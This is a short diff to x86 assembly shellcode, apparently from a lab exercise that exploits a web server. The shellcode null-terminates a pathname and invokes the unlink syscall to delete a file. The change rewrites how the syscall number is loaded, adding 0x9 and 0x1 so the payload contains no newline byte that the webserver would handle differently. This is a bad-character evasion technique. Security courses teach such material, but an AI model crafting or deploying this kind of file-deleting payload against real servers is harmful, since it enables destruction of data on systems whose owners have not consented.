@@ -16,7 +16,12 @@
 	xorl	%eax,%eax		/* get a 32-bit zero value */
 	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
 
-	movb	$SYS_unlink,%al		/* syscall arg 1: syscall number */
+	/* syscall arg 1: syscall number. unlink has syscall number 10, or '\n',
+	which the webserver will treat differently. To get around this, add bytes
+	0x9 and 0x1. */
+	movb	$0x9,%al
+	addb	$0x1,%al
+
 	movl	%esi,%ebx		/* syscall arg 2: string pathname */
 	int	$0x80			/* invoke syscall */
 
